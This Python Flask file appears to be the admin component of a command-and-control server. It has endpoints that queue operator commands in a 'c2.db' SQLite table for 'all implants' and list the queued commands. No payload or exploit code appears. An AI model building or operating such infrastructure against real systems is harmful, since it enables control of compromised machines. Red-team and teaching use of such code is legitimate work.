from flask import Blueprint, jsonify, request # type: ignore
import sqlite3, datetime

admin_blueprint = Blueprint("admin", __name__, url_prefix="/admin")

def get_db_conn():
    conn = sqlite3.connect("c2.db")
    conn.row_factory = sqlite3.Row
    return conn


"""
Queue a new command for all implants
"""
@admin_blueprint.route("/commands", methods=["POST"])
def add_command():
    data = request.get_json() or {}
    command = data.get("cmd")

    if not command:
        return jsonify({"message": "Command is missing"}), 400
    
    now = datetime.datetime.now().isoformat()
    with get_db_conn() as conn:
        cursor = conn.cursor()
        try:
            cursor.execute("INSERT INTO commands (command_text, sent_at) VALUES (?, ?)", (command, now))

            print(f"📨 - Command queued: {command} at {now} with ID {cursor.lastrowid}")
            return jsonify({"status": "queued", "command": command, "sent_at": now}), 201
        except sqlite3.Error as e:
            print(f"⚠️ - SQLite ERROR inserting command - {e}")
            return jsonify({"status": "error", "message": str(e)}), 500


"""
List all the queued commands
"""
@admin_blueprint.route("/commands", methods=["GET"])
def list_commands():
    with get_db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, command_text, sent_at FROM commands ORDER BY sent_at DESC")
        rows = cursor.fetchall()

    cmds = [dict(r) for r in rows]
    return jsonify(cmds), 200